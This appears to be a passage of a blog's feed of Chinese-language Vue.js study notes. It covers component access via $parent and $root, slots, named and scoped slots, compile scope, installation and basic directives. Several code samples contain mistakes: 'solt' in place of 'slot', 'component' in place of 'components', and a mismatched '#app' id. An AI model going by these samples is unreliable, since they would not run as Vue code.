class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&quot;hello&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">name</span>:<span class="string">&#x27;我是cpn组件的name&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">ccpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">template</span>:<span class="string">&quot;#ccpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">btnClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="comment">//1.访问父组件$parent</span></span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$parent</span>);</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$parent</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">                            </span></span><br><span class="line"><span class="language-javascript">                            <span class="comment">//2.访问根组件$root</span></span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$root</span>);</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$root</span>.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9.组件化高级（p69-72）">9.组件化高级（p69-72）<a title="#9.组件化高级（p69-72）" href="#9.组件化高级（p69-72）"></a></h2><h3 id="9.1插槽-slot">9.1插槽 slot<a title="#9.1插槽-slot" href="#9.1插槽-slot"></a></h3><h4 id="9.1-组件化插槽">9.1 组件化插槽<a title="#9.1-组件化插槽" href="#9.1-组件化插槽"></a></h4><ol><li>slot为插槽的意思，目的是让我们原来的设备具有更多的扩展性</li></ol><ul><li>组件化插槽是为了让我们封装的组件更加具有扩展性</li><li>让使用者可以决定组件内部的一些内容到底展示什么</li></ul><ol start="2"><li>如何去封装以京东导航栏为例子的这类组件：抽取共性，保留不同</li></ol><ul><li>将共性抽取到组件中，将不同暴露为插槽</li><li>一旦预留了插槽，就可以让使用者根据自己的需求，决定插槽中插入什么内容</li></ul><h4 id="9.2-插槽的基本使用">9.2 插槽的基本使用<a title="#9.2-插槽的基本使用" href="#9.2-插槽的基本使用"></a></h4><ol><li>基本使用</li><li>默认值</li><li>多个值时，会全部替换进去</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;#app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span>   <span class="comment">&lt;!-- 会把这个button放入插槽里 如果里面有多个 那也会全部显示出来 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">solt</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>如果没有传进想要的标签 就会默认显示插槽里的内容<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">solt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9.2-具名插槽slot">9.2 具名插槽slot<a title="#9.2-具名插槽slot" href="#9.2-具名插槽slot"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;#app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">solt</span>=<span class="string">&quot;center&quot;</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 如果没有加solt的属性 只会替换那些没有名字的插槽 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">solt</span> <span class="attr">name</span>=<span class="string">&#x27;left&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>左边<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">solt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">solt</span> <span class="attr">name</span>=<span class="string">&#x27;center&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>中间<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">solt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">solt</span> <span class="attr">name</span>=<span class="string">&#x27;right&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>右边<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">solt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9.3-编译作用域">9.3 编译作用域<a title="#9.3-编译作用域" href="#9.3-编译作用域"></a></h3><ul><li>父组件模板的所有东西都会在父级作用域内编译；子组件模板的所有东西都会在子级作用域内编译</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">v-show</span>=<span class="string">&#x27;isShow&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span> <span class="comment">&lt;!-- 使用实例的isShow --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&#x27;cpn&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="comment">&lt;!-- 使用组件的isShow --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isShow</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">component</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>:<span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">isShow</span>:<span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9.4-作用域插槽">9.4 作用域插槽<a title="#9.4-作用域插槽" href="#9.4-作用域插槽"></a></h3><ul><li>父组件替换插槽的标签，但是内容由子组件来提供</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 目的是 获取组件中的pLanguage --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 在2.5.x以下的版本 只能使用template 但是后面的版本可以直接 使用div--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 通过solt引用 下面插槽对象  下面用的solt.data 用的就是下面的data==planage--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot-scope</span>=<span class="string">&#x27;solt&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-for</span>=<span class="string">&#x27;item in  solt.data&#x27;</span>&gt;</span>&#123;&#123;item&#125;&#125; - <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot-scope</span>=<span class="string">&#x27;solt&#x27;</span>&gt;</span></span><br><span class="line">             <span class="comment">&lt;!-- 以‘ - ’分割 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;solt.data.join(&#x27; - &#x27;)&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&#x27;cpn&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- data是随便取的名字 意味着data指向pLanguage --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">solt</span> <span class="attr">:data</span>=<span class="string">&#x27;pLanguages&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&#x27;item in pLanguages&#x27;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">solt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">component</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">cpn</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>:<span class="string">&quot;#cpn&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">pLanguages</span>:[<span class="string">&#x27;js&#x27;</span>,<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01 Vue入门</title>
      <link href="/learningNotes/vue/01%E9%82%82%E9%80%85Vuejs"/>
      <url>/learningNotes/vue/01%E9%82%82%E9%80%85Vuejs</url>
      
        <content type="html"><![CDATA[<h2 id="1.-认识vuejs">1. 认识Vuejs<a title="#1.-认识vuejs" href="#1.-认识vuejs"></a></h2><h3 id="1.1-为什么学习vuejs">1.1 为什么学习Vuejs<a title="#1.1-为什么学习vuejs" href="#1.1-为什么学习vuejs"></a></h3><h3 id="1.2-简单认识vuejs">1.2 简单认识Vuejs<a title="#1.2-简单认识vuejs" href="#1.2-简单认识vuejs"></a></h3><ol><li><p>Vue（读音类似view）</p></li><li><p>Vue是一个渐进式框架（作为一部分嵌入页面js）</p><blockquote><p>Vue全家桶：Core+Vue-router+Vuex</p></blockquote></li><li><p>Vue有很多特点和Web开发中常见的高级功能</p><ul><li>解耦视图和数据</li><li>可复用的组件</li><li>前端路由技术</li><li>状态管理</li><li>虚拟DOM</li></ul></li></ol><h2 id="2.-vue.js安装方式">2. Vue.js安装方式<a title="#2.-vue.js安装方式" href="#2.-vue.js安装方式"></a></h2><h3 id="2.1-方式一：cdn引入">2.1 方式一：CDN引入<a title="#2.1-方式一：cdn引入" href="#2.1-方式一：cdn引入"></a></h3><ul><li><p>选择引入开发环境版本还是生产环境版本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开发环境版本，包含了由版主的命令行警告 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 生产环境版本，优化了尺寸和速度 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2.2-方式二：下载和引入">2.2 方式二：下载和引入<a title="#2.2-方式二：下载和引入" href="#2.2-方式二：下载和引入"></a></h3><p>开发环境：<a href="https://vuejs.org/js/vue.js">https://vuejs.org/js/vue.js</a></p><p>生产环境：<a href="https://vuejs.org/js/vue.min.js">https://vuejs.org/js/vue.min.js</a></p><h3 id="2.3-方式三：npm安装管理">2.3 方式三：NPM安装管理<a title="#2.3-方式三：npm安装管理" href="#2.3-方式三：npm安装管理"></a></h3><ul><li>后续通过webpack和CLI的使用，我们使用该方式</li></ul><h2 id="3.-vuejs初体验">3. Vuejs初体验<a title="#3.-vuejs初体验" href="#3.-vuejs初体验"></a></h2><h3 id="3.1-hello-vuejs">3.1 Hello Vuejs<a title="#3.1-hello-vuejs" href="#3.1-hello-vuejs"></a></h3><ul><li>vue：编程范式：声明式编程</li><li>js：编程范式：命令式编程</li></ul><h3 id="3.2-vue列表展示">3.2 Vue列表展示<a title="#3.2-vue列表展示" href="#3.2-vue列表展示"></a></h3><h3 id="3.3-案例：计数器">3.3 案例：计数器<a title="#3.3-案例：计数器" href="#3.3-案例：计数器"></a></h3><p>语法糖：简写的另一种说法</p><h2 id="4.-vuejs的mvvm">4. Vuejs的MVVM<a title="#4.-vuejs的mvvm" href="#4.-vuejs的mvvm"></a></h2><p>MVVM：（Model View View Model）最重要的是中间的ViewModel层，是View和Model之间安定桥梁</p><blockquote><p>学习一个概念最好的方式是去看维基百科</p><p><a href="https://zh.wikipedia.org/wiki/MVVM">https://zh.wikipedia.org/wiki/MVVM</a></p></blockquote><h3 id="4.1-vue中的mvvm">4.1 Vue中的MVVM<a title="#4.1-vue中的mvvm" href="#4.1-vue中的mvvm"></a></h3><img src='https://s1.328888.xyz/2022/04/09/XOxmt.jpg' style="zoom:60%;" ><img src='https://s1.328888.xyz/2022/04/09/XaQoe.jpg' style="zoom:60%;" ><h2 id="5.-创建vue实例传入的options">5. 创建Vue实例传入的options<a title="#5.-创建vue实例传入的options" href="#5.-创建vue实例传入的options"></a></h2><ul><li><p>options中可以包含的选项：<a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E6%95%B0%E6%8D%AE">https://cn.vuejs.org/v2/api/#选项-数据</a></p></li><li><p>目前掌握这些选项：</p><ol><li><p>el：</p><ul><li><font color='red'>类型：string|HTMLElement</font></li><li>作用：决定之后Vue实例会管理哪一个DOM</li></ul></li><li><p>data：</p><ul><li><font color='red'>类型：Object|Function （组件中data必须是一个函数）</font></li><li>作用：Vue实例对应的数据对象</li></ul></li><li><p>methods：</p><ul><li><p><font color='red'>类型：{ [key:string]:Function }</font></p></li><li><p>作用：定义属于Vue的一些方法，可以再其他地方调用，也可以在指令中使用</p><blockquote><p>不能使用箭头函数</p></blockquote></li></ul></li></ol></li></ul><h3 id="5.1-方法跟函数的区别">5.1 方法跟函数的区别<a title="#5.1-方法跟函数的区别" href="#5.1-方法跟函数的区别"></a></h3><p>方法：method</p><p>函数：function</p><p>一般在js中写的都是函数</p><p>但与实例挂钩的就是方法，例如类里面和Vue里面，方法是面向对象的</p><h3 id="5.2-vue的生命周期">5.2 Vue的生命周期<a title="#5.2-vue的生命周期" href="#5.2-vue的生命周期"></a></h3><p>事物从诞生到死亡</p><p>到GitHub下载源码时：不要直接下载开发版本，选择tag最新的稳定版</p><h2 id="模板">模板<a title="#模板" href="#模板"></a></h2><p>缩进更多使用两个空格</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02 Vue基础语法</title>
      <link href="/learningNotes/vue/02%20Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"/>
      <url>/learningNotes/vue/02%20Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95</url>
      
        <content type="html"><![CDATA[<h2 id="1.插值语法（p12-13）">1.插值语法（p12-13）<a title="#1.插值语法（p12-13）" href="#1.插值语法（p12-13）"></a></h2><h3 id="1.1-mustache语法">1.1 Mustache语法<a title="#1.1-mustache语法" href="#1.1-mustache语法"></a></h3><ul><li><p>插值表达式<code>&#123;&#123; &#125;&#125;</code></p></li><li><p>在内容区书写的 不能在属性值书写</p></li><li><p>不仅可以直接写变量 ，也可以写简单的表达式</p></li></ul><h3 id="1.2-其他指令的使用">1.2 其他指令的使用<a title="#1.2-其他指令的使用" href="#1.2-其他指令的使用"></a></h3><h4 id="v-once">v-once<a title="#v-once" href="#v-once"></a></h4><ul><li>某些情况下，可能不希望界面随意的跟随改变</li><li>该指令后面不需要跟任何表达式/值</li><li>该指令表示元素和组件只渲染一次，不会随着数据的改变而改变</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="v-html">v-html<a title="#v-html" href="#v-html"></a></h4><ul><li>某些情况下，从服务器请求到的数据本身就是html代码，if直接通过<code>&#123;&#123;&#125;&#125;`来输出，会将html代码也一起输出+ 该指令会将string的html解析出来并且进行渲染+ 该指令后面往往会跟上一个个string类型<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 